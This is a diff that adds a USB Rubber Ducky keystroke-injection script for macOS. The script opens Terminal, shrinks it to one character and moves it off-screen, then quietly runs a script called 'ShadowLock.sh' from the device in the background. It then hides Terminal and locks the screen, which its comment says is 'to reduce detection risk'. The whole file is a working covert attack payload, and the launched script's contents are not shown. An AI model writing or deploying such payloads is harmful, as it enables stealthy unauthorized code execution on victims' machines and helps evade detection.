@@ -1,0 +1,23 @@
+REM === Set Rubber Ducky to HID and STORAGE mode ===
+ATTACKMODE HID STORAGE
+
+REM === Open Spotlight and launch Terminal ===
+COMMAND SPACE
+DELAY 300
+STRING terminal
+ENTER
+
+REM === Resize the Terminal window to 1x1 and move it off-screen ===
+STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
+ENTER
+
+REM === Run the ShadowLock script from the hardcoded path (Change to the correct Rubberducky drive name===
+STRING cd /Volumes/DUCKY && ./ShadowLock.sh > /dev/null 2>&1 &
+ENTER
+
+REM === Hide the Terminal window ===
+GUI h
+
+REM === Log out the user to reduce detection risk ===
+CTRL GUI q
+
